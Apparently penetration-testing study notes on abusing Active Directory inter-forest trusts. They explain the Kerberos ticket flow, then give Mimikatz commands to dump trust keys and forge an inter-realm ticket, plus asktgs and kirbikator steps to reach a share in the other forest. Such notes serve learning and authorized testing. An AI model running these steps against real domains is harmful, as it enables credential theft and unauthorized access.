# abusing trusts across forests

## priv esc across trusts

* across forests. trust relationship needs to be established

### trust flow across forest

example. client in forest1 wants to access application in forest2

1. client --> forest1 DC
   * request tgt

2. forest1 DC --> client
   * sends tgt

3. client --> forest1 DC
   * show tgt, request tgs for application in forest2 

4. forest1 DC --> client
   * send inter-realm tgt (signed and encrypted with trust key)

5. client --> forest2 DC
   * sends inter-real tgt and request tgs

6. forest2 DC --> client
   * sends tgs

7. client --> application
   * present tgs for access

8. application --> client
   * optional mutual auth

9. forest1 DC <----> forest2 DC


note: only validation that the forst2 DC does is if it can decrypt the inter-realm tgt which is encrypted with the trust key. if we have access to the trust key, we can forge a inter-realm tgt.


#### we require the trust key for the inter-forest trust
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

or

Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### inter-forest tgt can be forged
```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Adminstrator /domain:child1.parent1.local /sid:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /rc4:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /service:krbtgt /target:parent2.local /ticket:C:\path\to\save\ticket\trust_forest_tkt.kirbi"'
```

#### get a tgs for a service (example cifs) in the target domain/forest by using the gorged trust ticket
```powershell
.\asktgs.exe C:\path\to\save\ticket\trust_forest_tkt.kirbi CIFS/parent2-dc.parent2.local
```

* tickets for other services ( host and rpcss for wmi, host and http for powershell remoting and winrm) can be created too

#### use the tgs to access the targeted service
```powershell
.\kirbikator.exe lsa .\CIFS.parent2-dc.parent2.local.kirbi

ls \\parent2-dc.parent2.local\forestshare\
```




































